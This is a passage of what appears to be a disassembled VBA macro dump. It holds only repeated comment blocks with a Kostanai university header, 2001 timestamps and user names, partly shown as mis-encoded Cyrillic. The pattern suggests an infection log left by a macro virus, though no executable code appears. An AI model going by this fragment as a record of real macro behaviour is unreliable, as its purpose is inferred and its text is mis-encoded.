' Line #1438:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1439:
' Line #1440:
' Line #1441:
' Line #1442:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1443:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1444:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1445:
' 	QuoteRem 0x0000 0x0024 " 13:27:38 - ïîíåäåëüíèê, 18 èþí 2001"
' Line #1446:
' 	QuoteRem 0x0000 0x0004 " Ice"
' Line #1447:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1448:
' Line #1449:
' Line #1450:
' Line #1451:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1452:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1453:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1454:
' 	QuoteRem 0x0000 0x0024 " 12:10:21 - âîñêðåñåíüå, 24 èþí 2001"
' Line #1455:
' 	QuoteRem 0x0000 0x0006 " St_p2"
' Line #1456:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1457:
' Line #1458:
' Line #1459:
' Line #1460:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1461:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1462:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1463:
' 	QuoteRem 0x0000 0x0020 " 18:26:54 - ÷åòâåðã, 28 èþí 2001"
' Line #1464:
' 	QuoteRem 0x0000 0x0006 " St_p2"
' Line #1465:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1466:
' Line #1467:
' Line #1468:
' Line #1469:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1470:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1471:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1472:
' 	QuoteRem 0x0000 0x0020 " 19:12:04 - ÷åòâåðã, 28 èþí 2001"
' Line #1473:
' 	QuoteRem 0x0000 0x0006 " St_p2"
' Line #1474:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1475:
' Line #1476:
' Line #1477:
' Line #1478:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1479:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1480:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1481:
' 	QuoteRem 0x0000 0x0023 " 08:46:30 - ïîíåäåëüíèê, 2 èþë 2001"
' Line #1482:
' 	QuoteRem 0x0000 0x0006 " St_p2"
' Line #1483:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1484:
' Line #1485:
' Line #1486:
' Line #1487:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1488:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1489:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1490:
' 	QuoteRem 0x0000 0x0023 " 12:54:08 - ïîíåäåëüíèê, 9 èþë 2001"
' Line #1491:
' 	QuoteRem 0x0000 0x0006 " st_p7"
' Line #1492:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1493:
' Line #1494:
' Line #1495:
' Line #1496:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1497:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1498:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1499:
' 	QuoteRem 0x0000 0x0023 " 13:38:22 - ïîíåäåëüíèê, 9 èþë 2001"
' Line #1500:
' 	QuoteRem 0x0000 0x0006 " st_p7"
' Line #1501:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1502:
' Line #1503:
' Line #1504:
' Line #1505:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1506:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1507:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1508:
' 	QuoteRem 0x0000 0x0023 " 14:06:17 - ïîíåäåëüíèê, 9 èþë 2001"
' Line #1509:
' 	QuoteRem 0x0000 0x0006 " st_p7"
' Line #1510:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1511:
' Line #1512:
' Line #1513:
' Line #1514:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1515:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1516:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1517:
' 	QuoteRem 0x0000 0x001E " 11:06:55 - ñðåäà, 11 èþë 2001"
' Line #1518:
' 	QuoteRem 0x0000 0x0006 " st_p7"
' Line #1519:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1520:
' Line #1521:
' Line #1522:
' Line #1523:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1524:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1525:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1526:
' 	QuoteRem 0x0000 0x0020 " 16:55:41 - ïÿòíèöà, 13 èþë 2001"
' Line #1527:
' 	QuoteRem 0x0000 0x0006 " st_p7"
' Line #1528:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1529:
' Line #1530:
' Line #1531:
' Line #1532:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1533:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1534:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1535:
' 	QuoteRem 0x0000 0x0020 " 09:58:06 - ñóááîòà, 14 èþë 2001"
' Line #1536:
' 	QuoteRem 0x0000 0x0006 " st_p7"
' Line #1537:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1538:
' Line #1539:
' Line #1540:
' Line #1541:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1542:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1543:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1544:
' 	QuoteRem 0x0000 0x0020 " 12:48:50 - ñóááîòà, 14 èþë 2001"
' Line #1545:
' 	QuoteRem 0x0000 0x0006 " st_p7"
' Line #1546:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1547:
' Line #1548:
' Line #1549:
' Line #1550:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1551:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1552:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1553:
' 	QuoteRem 0x0000 0x0024 " 11:08:50 - ïîíåäåëüíèê, 23 èþë 2001"
' Line #1554:
' 	QuoteRem 0x0000 0x000B " Áîæêî Ë.Ë."
' Line #1555:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1556:
' Line #1557:
' Line #1558:
' Line #1559:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1560:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1561:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1562:
' 	QuoteRem 0x0000 0x0024 " 11:22:15 - ïîíåäåëüíèê, 23 èþë 2001"
' Line #1563:
' 	QuoteRem 0x0000 0x000B " Áîæêî Ë.Ë."
' Line #1564:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1565:
' Line #1566:
' Line #1567:
' Line #1568:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1569:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1570:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1571:
' 	QuoteRem 0x0000 0x0024 " 11:24:01 - ïîíåäåëüíèê, 23 èþë 2001"
' Line #1572:
' 	QuoteRem 0x0000 0x000B " Áîæêî Ë.Ë."
' Line #1573:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1574:
' Line #1575:
' Line #1576:
' Line #1577:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1578:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1579:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1580:
' 	QuoteRem 0x0000 0x0024 " 09:44:58 - ïîíåäåëüíèê, 30 èþë 2001"
' Line #1581:
' 	QuoteRem 0x0000 0x000B " Áîæêî Ë.Ë."
' Line #1582:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1583:
' Line #1584:
' Line #1585:
' Line #1586:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1587:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1588:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1589:
' 	QuoteRem 0x0000 0x0024 " 11:29:59 - ïîíåäåëüíèê, 30 èþë 2001"
' Line #1590:
' 	QuoteRem 0x0000 0x000B " Áîæêî Ë.Ë."
' Line #1591:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1592:
' Line #1593:
' Line #1594:
' Line #1595:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1596:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1597:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1598:
' 	QuoteRem 0x0000 0x0024 " 12:22:43 - ïîíåäåëüíèê, 30 èþë 2001"
' Line #1599:
' 	QuoteRem 0x0000 0x000B " Áîæêî Ë.Ë."
' Line #1600:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1601:
' Line #1602:
' Line #1603:
' Line #1604:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1605:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1606:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1607:
' 	QuoteRem 0x0000 0x001F " 09:21:57 - ÷åòâåðã, 2 àâã 2001"
' Line #1608:
' 	QuoteRem 0x0000 0x000B " Áîæêî Ë.Ë."
' Line #1609:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1610:
' Line #1611:
' Line #1612:
' Line #1613:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1614:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1615:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1616:
' 	QuoteRem 0x0000 0x001F " 14:16:36 - âòîðíèê, 7 àâã 2001"
' Line #1617:
' 	QuoteRem 0x0000 0x000B " Áîæêî Ë.Ë."
' Line #1618:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1619:
' Line #1620:
' Line #1621:
' Line #1622:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1623:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1624:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1625:
' 	QuoteRem 0x0000 0x0024 " 18:55:32 - ïîíåäåëüíèê, 13 àâã 2001"
' Line #1626:
' 	QuoteRem 0x0000 0x000B " Áîæêî Ë.Ë."
' Line #1627:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1628:
' Line #1629:
' Line #1630:
' Line #1631:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1632:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1633:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1634:
' 	QuoteRem 0x0000 0x0022 " 11:00:34 - ïîíåä³ëîê, 20 Ñåð 2001"
' Line #1635:
' 	QuoteRem 0x0000 0x000F " Ìèõåðñêàÿ Í.À."
' Line #1636:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1637:
' Line #1638:
' Line #1639:
' Line #1640:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1641:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1642:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1643:
' 	QuoteRem 0x0000 0x001F " 10:39:59 - ñåðåäà, 22 Ñåð 2001"
' Line #1644:
' 	QuoteRem 0x0000 0x000F " Ìèõåðñêàÿ Í.À."
' Line #1645:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1646:
' Line #1647:
' Line #1648:
' Line #1649:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1650:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1651:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1652:
' 	QuoteRem 0x0000 0x0020 " 16:52:51 - ï'ÿòíèöÿ, 7 Âåð 2001"
' Line #1653:
' 	QuoteRem 0x0000 0x000F " Ìèõåðñêàÿ Í.À."
' Line #1654:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1655:
' Line #1656:
' Line #1657:
' Line #1658:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1659:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1660:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1661:
' 	QuoteRem 0x0000 0x0021 " 17:23:14 - ï'ÿòíèöÿ, 14 Âåð 2001"
' Line #1662:
' 	QuoteRem 0x0000 0x000F " Ìèõåðñêàÿ Í.À."
' Line #1663:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1664:
' Line #1665:
' Line #1666:
' Line #1667:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1668:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1669:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1670:
' 	QuoteRem 0x0000 0x0022 " 08:42:33 - ïîíåä³ëîê, 17 Âåð 2001"
' Line #1671:
' 	QuoteRem 0x0000 0x000F " Ìèõåðñêàÿ Í.À."
' Line #1672:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1673:
' Line #1674:
' Line #1675:
' Line #1676:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1677:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1678:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1679:
' 	QuoteRem 0x0000 0x0022 " 10:02:24 - ïîíåä³ëîê, 17 Âåð 2001"
' Line #1680:
' 	QuoteRem 0x0000 0x000F " Ìèõåðñêàÿ Í.À."
' Line #1681:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1682:
' Line #1683:
' Line #1684:
' Line #1685:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1686:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1687:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1688:
' 	QuoteRem 0x0000 0x001F " 18:06:34 - ÷åòâåð, 20 Âåð 2001"
' Line #1689:
' 	QuoteRem 0x0000 0x000F " Ìèõåðñêàÿ Í.À."
' Line #1690:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1691:
' Line #1692:
' Line #1693:
' Line #1694:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1695:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1696:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1697:
' 	QuoteRem 0x0000 0x0022 " 20:25:06 - ïîíåä³ëîê, 24 Âåð 2001"
' Line #1698:
' 	QuoteRem 0x0000 0x000F " Ìèõåðñêàÿ Í.À."
' Line #1699:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1700:
' Line #1701:
' Line #1702:
' Line #1703:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1704:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1705:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1706:
' 	QuoteRem 0x0000 0x0022 " 20:25:43 - ïîíåä³ëîê, 24 Âåð 2001"
' Line #1707:
' 	QuoteRem 0x0000 0x000F " Ìèõåðñêàÿ Í.À."
' Line #1708:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1709:
' Line #1710:
' Line #1711:
' Line #1712:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1713:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1714:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1715:
' 	QuoteRem 0x0000 0x0021 " 17:23:32 - ï'ÿòíèöÿ, 28 Âåð 2001"
' Line #1716:
' 	QuoteRem 0x0000 0x000F " Ìèõåðñêàÿ Í.À."
' Line #1717:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1718:
' Line #1719:
' Line #1720:
' Line #1721:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1722:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1723:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1724:
' 	QuoteRem 0x0000 0x0021 " 17:24:11 - ï'ÿòíèöÿ, 28 Âåð 2001"
' Line #1725:
' 	QuoteRem 0x0000 0x000F " Ìèõåðñêàÿ Í.À."
' Line #1726:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1727:
' Line #1728:
' Line #1729:
' Line #1730:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1731:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1732:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1733:
' 	QuoteRem 0x0000 0x0021 " 17:24:52 - ï'ÿòíèöÿ, 28 Âåð 2001"
' Line #1734:
' 	QuoteRem 0x0000 0x000F " Ìèõåðñêàÿ Í.À."
' Line #1735:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1736:
' Line #1737:
' Line #1738:
' Line #1739:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1740:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1741:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1742:
' 	QuoteRem 0x0000 0x0021 " 13:00:40 - ïîíåä³ëîê, 1 Æîâ 2001"
' Line #1743:
' 	QuoteRem 0x0000 0x000F " Ìèõåðñêàÿ Í.À."
' Line #1744:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1745:
' Line #1746:
' Line #1747:
' Line #1748:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1749:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1750:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1751:
' 	QuoteRem 0x0000 0x0020 " 09:34:11 - â³âòîðîê, 2 Æîâ 2001"
' Line #1752:
' 	QuoteRem 0x0000 0x000F " Ìèõåðñêàÿ Í.À."
' Line #1753:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1754:
' Line #1755:
' Line #1756:
' Line #1757:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1758:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1759:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1760:
' 	QuoteRem 0x0000 0x001E " 20:46:17 - ñåðåäà, 3 Æîâ 2001"
' Line #1761:
' 	QuoteRem 0x0000 0x000F " Ìèõåðñêàÿ Í.À."
' Line #1762:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1763:
' Line #1764:
' Line #1765:
' Line #1766:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1767:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1768:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1769:
' 	QuoteRem 0x0000 0x0020 " 09:05:46 - â³âòîðîê, 9 Æîâ 2001"
' Line #1770:
' 	QuoteRem 0x0000 0x000F " Ìèõåðñêàÿ Í.À."
' Line #1771:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1772:
' Line #1773:
' Line #1774:
' Line #1775:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1776:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1777:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1778:
' 	QuoteRem 0x0000 0x0020 " 13:41:37 - ïÿòíèöà, 12 îêò 2001"
' Line #1779:
' 	QuoteRem 0x0000 0x000A " NSmirnova"
' Line #1780:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1781:
' Line #1782:
' Line #1783:
' Line #1784:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1785:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1786:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1787:
' 	QuoteRem 0x0000 0x0020 " 15:20:04 - ïÿòíèöà, 12 îêò 2001"
' Line #1788:
' 	QuoteRem 0x0000 0x000A " NSmirnova"
' Line #1789:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1790:
' Line #1791:
' Line #1792:
' Line #1793:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1794:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1795:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1796:
' 	QuoteRem 0x0000 0x0020 " 15:20:10 - ïÿòíèöà, 12 îêò 2001"
' Line #1797:
' 	QuoteRem 0x0000 0x000A " NSmirnova"
' Line #1798:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1799:
' Line #1800:
' Line #1801:
' Line #1802:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1803:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1804:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1805:
' 	QuoteRem 0x0000 0x0020 " 16:00:58 - ïÿòíèöà, 12 îêò 2001"
' Line #1806:
' 	QuoteRem 0x0000 0x000A " NSmirnova"
' Line #1807:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1808:
' Line #1809:
' Line #1810:
' Line #1811:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1812:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1813:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1814:
' 	QuoteRem 0x0000 0x0020 " 16:23:49 - ïÿòíèöà, 12 îêò 2001"
' Line #1815:
' 	QuoteRem 0x0000 0x000A " NSmirnova"
' Line #1816:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1817:
' Line #1818:
' Line #1819:
' Line #1820:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1821:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1822:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1823:
' 	QuoteRem 0x0000 0x001E " 16:57:57 - ñðåäà, 21 íîÿ 2001"
' Line #1824:
' 	QuoteRem 0x0000 0x0002 " 1"
' Line #1825:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1826:
' Line #1827:
' Line #1828:
' Line #1829:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1830:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1831:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1832:
' 	QuoteRem 0x0000 0x001E " 10:09:37 - ñðåäà, 28 íîÿ 2001"
' Line #1833:
' 	QuoteRem 0x0000 0x0002 " 1"
' Line #1834:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1835:
' Line #1836:
' Line #1837:
' Line #1838:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1839:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1840:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1841:
' 	QuoteRem 0x0000 0x001F " 16:52:42 - ïÿòíèöà, 7 äåê 2001"
' Line #1842:
' 	QuoteRem 0x0000 0x0002 " 1"
' Line #1843:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1844:
' Line #1845:
' Line #1846:
' Line #1847:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1848:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1849:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1850:
' 	QuoteRem 0x0000 0x0024 " 15:35:30 - ïîíåäåëüíèê, 10 äåê 2001"
' Line #1851:
' 	QuoteRem 0x0000 0x0002 " 1"
' Line #1852:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1853:
' Line #1854:
' Line #1855:
' Line #1856:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1857:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1858:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1859:
' 	QuoteRem 0x0000 0x0024 " 15:35:56 - ïîíåäåëüíèê, 10 äåê 2001"
' Line #1860:
' 	QuoteRem 0x0000 0x0002 " 1"
' Line #1861:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1862:
' Line #1863:
' Line #1864:
' Line #1865:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1866:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1867:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1868:
' 	QuoteRem 0x0000 0x0020 " 14:46:50 - ÷åòâåðã, 13 äåê 2001"
' Line #1869:
' 	QuoteRem 0x0000 0x000B " Êèñëåíêîâà"
' Line #1870:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1871:
' Line #1872:
' Line #1873:
' Line #1874:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1875:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1876:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1877:
